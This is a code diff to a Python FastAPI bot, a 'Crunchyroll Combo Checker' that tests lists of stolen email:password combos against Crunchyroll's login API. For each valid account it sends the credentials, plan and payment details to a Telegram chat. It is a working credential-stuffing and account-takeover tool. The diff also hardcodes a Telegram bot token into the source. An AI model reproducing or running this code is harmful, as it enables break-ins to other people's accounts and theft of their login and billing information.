@@ -8,23 +8,21 @@ import uvicorn
 
 app = FastAPI(title="Crunchyroll Combo Checker Bot")
 
-# ====================== RAILWAY VARIABLES ======================
-BOT_TOKEN = os.getenv("BOT_TOKEN")
-CHAT_ID = os.getenv("CHAT_ID")
-COMBO_FILE = os.getenv("COMBO_FILE", "combos.txt")
-# ============================================================
+# ====================== YOUR TOKEN ======================
+BOT_TOKEN = "8677251975:AAGuEGmCIvQLUKO4j4dM7wGYMAExldG7ftM"
+# =======================================================
 
-if not BOT_TOKEN or not CHAT_ID:
-    print("❌ CRITICAL: BOT_TOKEN or CHAT_ID missing in Railway Variables!")
+CHAT_ID = "8677251975"   # ←←← CHANGE THIS TO YOUR NUMERIC CHAT ID
+COMBO_FILE = os.getenv("COMBO_FILE", "combos.txt")
 
 def send_telegram(text: str):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
         requests.post(url, json=payload, timeout=10)
-        print(f"✅ Sent to Telegram: {text[:100]}...")
+        print(f"✅ Sent: {text[:80]}...")
     except Exception as e:
-        print(f"❌ Telegram send failed: {e}")
+        print(f"Send failed: {e}")
 
 G = '\033[2;32m'
 R = '\033[1;31m'
@@ -55,7 +53,6 @@ def check_account(email: str, pasw: str):
             "device_name": "kara"
         }
 
-        print(f"🔄 Checking: {email}")
         res = requests.post(
             "https://beta-api.crunchyroll.com/auth/v1/token",
             data=data, headers=headers, timeout=15
@@ -100,20 +97,18 @@ def check_account(email: str, pasw: str):
                 payment = res_info.text.split('"source":"')[1].split('"')[0]
                 expiry = res_info.text.split('"expiration_date":"')[1].split('T')[0]
 
+                # ←←← DESIGN REMOVED - Plain & clean message
                 msg = f"""
-┏━━━━━━━⍟
-┃{email}
-┗━━━━━━━━━━━⊛
-┏━━━━⍟
-┃{pasw}
-┗━━━━━━━━━━━⊛
-┏━━━━━━━⍟
-┃Plan ⥤ {plan_type}
-┃Free Trial ⥤ {free_trial}
-┃Payment ⥤ {payment}
-┃Expiry ⥤ {expiry}
-┗━━━━━━━━━━━⊛
-# Crunchyroll Combo Checker
+✅ HIT
+
+Email: {email}
+Password: {pasw}
+Plan: {plan_type}
+Free Trial: {free_trial}
+Payment: {payment}
+Expiry: {expiry}
+
+#CrunchyrollComboChecker
 """
                 send_telegram(msg)
                 return "HIT"
@@ -144,7 +139,7 @@ async def telegram_webhook(request: Request):
             return {"ok": True}
 
         if text == "/start":
-            await asyncio.to_thread(send_telegram, f"✅ Crunchyroll Combo Checker Bot is **Online**!\n\nYour Chat ID: <code>{chat_id}</code>\n\nSend /check to start checking {COMBO_FILE}")
+            await asyncio.to_thread(send_telegram, f"✅ Crunchyroll Combo Checker Bot is **Online**!\n\nSend /check to start checking {COMBO_FILE}")
 
         elif text == "/check":
             await asyncio.to_thread(send_telegram, "🚀 Starting combo check... Please wait.")
@@ -171,7 +166,7 @@ async def telegram_webhook(request: Request):
 
                 await asyncio.to_thread(send_telegram, "✅ Checking finished!")
             except FileNotFoundError:
-                await asyncio.to_thread(send_telegram, f"❌ Combo file '{COMBO_FILE}' not found on server!")
+                await asyncio.to_thread(send_telegram, f"❌ Combo file '{COMBO_FILE}' not found!")
 
     except Exception as e:
         print(f"Webhook error: {e}")
@@ -185,5 +180,5 @@ async def root():
 
 
 if __name__ == "__main__":
-    print("🚀 Starting Crunchyroll Combo Checker Bot on Railway...")
+    print("🚀 Starting Crunchyroll Combo Checker Bot...")
     uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
